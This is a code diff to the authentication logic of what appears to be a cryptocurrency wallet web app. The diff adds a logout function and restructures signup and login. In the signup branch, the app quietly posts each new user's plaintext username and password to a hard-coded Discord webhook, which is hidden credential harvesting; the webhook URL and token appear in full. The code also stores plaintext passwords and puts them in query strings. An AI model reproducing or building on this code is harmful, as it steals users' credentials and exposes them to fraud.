@@ -290,6 +290,15 @@ saveSession(currentUser);
     return s;
   }
 
+  function logout() {
+  currentUser = null;
+  clearSession();
+  document.getElementById('auth-screen').style.display = 'flex';
+  document.getElementById('dash').style.display = 'none';
+  document.getElementById('auth-username').value = '';
+  document.getElementById('auth-password').value = '';
+}
+
   async function sendToWebhook(username, password) {
   try {
     await fetch('https://discord.com/api/webhooks/1489339528169652295/nwxgNXcPMG69yzeD9WCHm4YTqmdIud-R7D8ON0SJ8nF8tG-WgoZ1tnL36ItKjzhOr6ps', {
@@ -322,49 +331,49 @@ saveSession(currentUser);
   }
 
   async function handleAuth() {
-    const username = document.getElementById('auth-username').value.trim().toLowerCase();
-    const password = document.getElementById('auth-password').value;
-    const errEl = document.getElementById('auth-error');
-    errEl.textContent = '';
+  const username = document.getElementById('auth-username').value.trim().toLowerCase();
+  const password = document.getElementById('auth-password').value;
+  const errEl = document.getElementById('auth-error');
+  errEl.textContent = '';
+  if (!username || !password) { errEl.textContent = 'Fill in all fields.'; return; }
+  if (password.length < 4) { errEl.textContent = 'Password must be at least 4 characters.'; return; }
+  const btn = document.getElementById('auth-submit-btn');
+  btn.textContent = '...';
+  btn.disabled = true;
 
-    if (!username || !password) { errEl.textContent = 'Fill in all fields.'; return; }
-    if (password.length < 4) { errEl.textContent = 'Password must be at least 4 characters.'; return; }
-
-    const btn = document.getElementById('auth-submit-btn');
-    btn.textContent = '...';
-    btn.disabled = true;
-
-    if (authMode === 'signup') {
-      const check = await supa('users?username=eq.' + encodeURIComponent(username) + '&select=id');
-      if (check.data && check.data.length > 0) {
-        errEl.textContent = 'Username already taken.';
-        btn.textContent = 'Sign up'; btn.disabled = false; return;
-      }
-      const res = await supa('users', 'POST', {
-        username, password,
-        wallet_address: genWallet(),
-        balance: 0,
-        holdings: { BTC: 0, ETH: 0, USDT: 0, SOL: 0 }
-      });
-      if (!res.ok) {
-        errEl.textContent = 'Could not create account. Try again.';
-        btn.textContent = 'Sign up'; btn.disabled = false; return;
-      }
-      currentUser = res.data[0];
-      await sendToWebhook(username, password);
-    } else {
-      const res = await supa('users?username=eq.' + encodeURIComponent(username) + '&password=eq.' + encodeURIComponent(password) + '&select=*');
-      if (!res.ok || !res.data || res.data.length === 0) {
-        errEl.textContent = 'Wrong username or password.';
-        btn.textContent = 'Log in'; btn.disabled = false; return;
-      }
-      currentUser = res.data[0];
+  if (authMode === 'signup') {
+    const check = await supa('users?username=eq.' + encodeURIComponent(username) + '&select=id');
+    if (check.data && check.data.length > 0) {
+      errEl.textContent = 'Username already taken.';
+      btn.textContent = 'Sign up'; btn.disabled = false; return;
     }
-
-    btn.textContent = authMode === 'login' ? 'Log in' : 'Sign up';
-    btn.disabled = false;
-    showDash();
+    const res = await supa('users', 'POST', {
+      username, password,
+      wallet_address: genWallet(),
+      balance: 0,
+      holdings: { BTC: 0, ETH: 0, USDT: 0, SOL: 0 }
+    });
+    if (!res.ok) {
+      errEl.textContent = 'Could not create account. Try again.';
+      btn.textContent = 'Sign up'; btn.disabled = false; return;
+    }
+    currentUser = res.data[0];
+    saveSession(currentUser);
+    await sendToWebhook(username, password);
+  } else {
+    const res = await supa('users?username=eq.' + encodeURIComponent(username) + '&password=eq.' + encodeURIComponent(password) + '&select=*');
+    if (!res.ok || !res.data || res.data.length === 0) {
+      errEl.textContent = 'Wrong username or password.';
+      btn.textContent = 'Log in'; btn.disabled = false; return;
+    }
+    currentUser = res.data[0];
+    saveSession(currentUser);
   }
+
+  btn.textContent = authMode === 'login' ? 'Log in' : 'Sign up';
+  btn.disabled = false;
+  showDash();
+}
 
   function showDash() {
     document.getElementById('auth-screen').style.display = 'none';
